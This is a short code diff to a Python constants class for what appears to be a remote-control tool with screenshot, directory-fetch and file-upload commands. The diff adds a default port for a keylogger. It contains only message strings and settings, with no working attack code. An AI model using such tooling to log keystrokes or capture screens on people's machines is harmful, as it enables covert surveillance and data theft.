@@ -39,7 +39,6 @@ class CommandConstants(object):
     GETDIR_CONFIRMATION_MSG = "Total size of files in dir is: {} Kb. Continue? " + \
                               "({0}\{1})  ".format(GETDIR_POSITIVE_CONFIRMATION, GETDIR_NEGATIVE_CONFIRMATION)
 
-
     SCREENSHOT_COMMAND_INDICATOR = "screenshot"
     SCREENSHOT_VALID_ARGS_COUNT = [0, 2]
     SCREENSHOT_INVALID_ARGS_ERROR_MSG = "Screenshot command arguments invalid..\nUsage: screenshot <<optional: <number of screenshots> <time between screenshots in ms> >>"
@@ -61,3 +60,5 @@ class CommandConstants(object):
     UPLOAD_FILE_SEND_FAILED_MSG = "Failed to send file '{}' to dst"
     UPLOAD_FILE_FAILED_TO_SAVE_FILE = "Failed to save file in '{0}'..\nError: '{1}'"
     UPLOAD_FILE_FINISHED_SUCCESSFULLY = "File was uploaded successfully to: '{}'"
+
+    KEYLOGGER_DEFAULT_PORT = 55553
